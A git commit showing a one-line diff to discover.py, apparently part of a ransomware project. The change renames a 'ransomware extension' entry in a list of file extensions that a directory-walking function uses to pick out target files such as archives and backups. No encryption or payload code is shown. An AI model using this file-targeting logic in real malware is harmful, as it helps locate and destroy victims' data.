0532f33c8656a3afab2ee5e9951cfa04545ddd5d
hafizhfahss <61222459+hafizhfahss@users.noreply.github.com>
2025-04-17 14:40:30 +0700

    discover.py

--- discover.py
+++ discover.py
@@ -42,7 +42,7 @@ def discoverFiles(startpath):
 
         'zip', 'tar', 'tgz', 'bz2', '7z', 'rar', 'bak',  # compressed formats
 
-        'wasted', # ransomware extension
+        'ransomeware', # ransomware extension
     ]
 
     for dirpath, dirs, files in os.walk(startpath):
